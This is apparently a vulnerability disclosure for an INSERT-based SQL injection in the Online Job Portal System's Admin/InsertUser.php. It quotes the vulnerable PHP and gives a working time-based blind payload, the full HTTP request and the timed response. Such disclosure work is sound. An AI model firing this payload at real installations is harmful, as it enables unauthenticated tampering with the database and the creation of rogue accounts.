## ONLINE_JOB_PORTAL_SYSTEM InsertUser.php INSERT-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `txtUserName` and `txtPassword` parameters of `Admin/InsertUser.php` are concatenated into an `INSERT ... VALUES` statement without any escaping, so an attacker can inject SQL expressions into the value list. By placing a `sleep()` call inside the injected expression the attacker can delay the server response at will, and because the injected expression is evaluated as part of the `VALUES` clause the attacker can also control what is written into `user_master`, including creating a new administrator account. The endpoint performs no session check, so it can be reached without logging in.

### II. Source Code Analysis

The vulnerability resides in `Admin/InsertUser.php`, lines 11-19:

```php
$UserName=$_POST['txtUserName'];
$Password=$_POST['txtPassword'];
// Establish Connection with MYSQL
$con = mysqli_connect ("localhost","root","","job");

// Specify the query to Insert Record
$sql = "insert into User_Master	(UserName,Password) values('".$UserName."','".$Password."')";
// execute query
mysqli_query ($con,$sql);
```

Both parameters are taken directly from `$_POST` and placed inside single-quoted literals in the `VALUES` list. No `mysqli_real_escape_string()`, no type casting and no prepared statement is used, so a single quote in either parameter terminates the literal and the remainder of the value is parsed as SQL. `mysqli_query()` is called without checking its return value, and the success message on line 22 is printed unconditionally, which means a failed or injected statement is indistinguishable from a normal insert on the response page — the injection is therefore blind and is best confirmed through response timing.

The file does not include `session.php` or any other authentication check, and `$_POST` is processed before anything else, so the query is executed for any request that reaches it.

### III. Payload

The core injection payload is:

```
111'and(select*from(select sleep(5))a)='
```

The resulting SQL statement executed by the server becomes:

```sql
insert into User_Master (UserName,Password) values('12','111'and(select*from(select sleep(5))a)='')
```

The leading `111'` closes the `Password` literal, `and(select*from(select sleep(5))a)` wraps `sleep()` in a derived table so that it can be used as a scalar expression and forces MySQL to wait five seconds, and the trailing `=''` re-balances the quote appended by the PHP template. The whole expression evaluates to `1`, so the row is still written and the password column receives the value `1`.

```
POST /Admin/InsertUser.php HTTP/1.1
Host: job
Content-Length: 81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://job
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://job/Admin/User.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a8lsjo418cuqjme60vfvhv159c
Connection: keep-alive

txtUserName=12&txtPassword=111'and(select*from(select+sleep(5))a)='&button=Submit
```

The response is returned after 5.06 seconds instead of immediately, and the inserted row is present in `user_master` afterwards, which confirms that the injected `sleep()` was executed by the database and that the `VALUES` list accepted the injected expression:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 08:17:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 410

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<body>
<script type="text/javascript">alert("User Inserted Succesfully");window.location='User.php';</script></body>
</html>
```

### IV. Source Download

https://code-projects.org/online-job-portal-system-in-php-with-source-code/



![image-20261030162412249](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030162412249.png)

